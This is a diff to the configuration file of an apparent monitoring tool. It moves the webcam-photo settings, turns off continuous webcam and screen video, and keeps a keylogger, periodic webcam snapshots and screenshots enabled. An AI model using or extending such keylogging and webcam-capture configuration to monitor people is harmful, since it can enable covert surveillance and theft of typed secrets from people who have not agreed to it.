@@ -33,6 +33,12 @@ WEBCAM_HEIGHT = 480
 WEBCAM_CODEC = "mp4v"            # default codec with broad OpenCV/FFmpeg availability
 
 # ------------------------------------------------------------------
+# Webcam photo settings
+# ------------------------------------------------------------------
+WEBCAM_PHOTOS_DIR      = os.path.join(BASE_DIR, "webcam_photos")
+WEBCAM_PHOTO_INTERVAL  = 60   # seconds between webcam snapshots (1 minute)
+
+# ------------------------------------------------------------------
 # Keyboard monitoring
 # ------------------------------------------------------------------
 KEYBOARD_LOG_FILE = os.path.join(LOGS_DIR, "keyboard.log")
@@ -77,14 +83,10 @@ MAX_STORAGE_MB = 10_240           # 10 GB
 # ------------------------------------------------------------------
 # Feature flags  (set to 1 to enable, 0 to disable)
 # ------------------------------------------------------------------
-WEBCAM_RECORD = 1    # continuous webcam video recording
+WEBCAM_RECORD = 0    # continuous webcam video recording
 WEBCAM_PHOTO  = 1    # periodic webcam snapshots (one photo per interval)
-SCREEN_RECORD = 1    # continuous screen video recording
+SCREEN_RECORD = 0    # continuous screen video recording
 SCREEN_SHOT   = 1    # periodic screenshots
 KEY_LOGGER    = 1    # keyboard activity logging
 
-# ------------------------------------------------------------------
-# Webcam photo settings
-# ------------------------------------------------------------------
-WEBCAM_PHOTOS_DIR      = os.path.join(BASE_DIR, "webcam_photos")
-WEBCAM_PHOTO_INTERVAL  = 60   # seconds between webcam snapshots (1 minute)
+
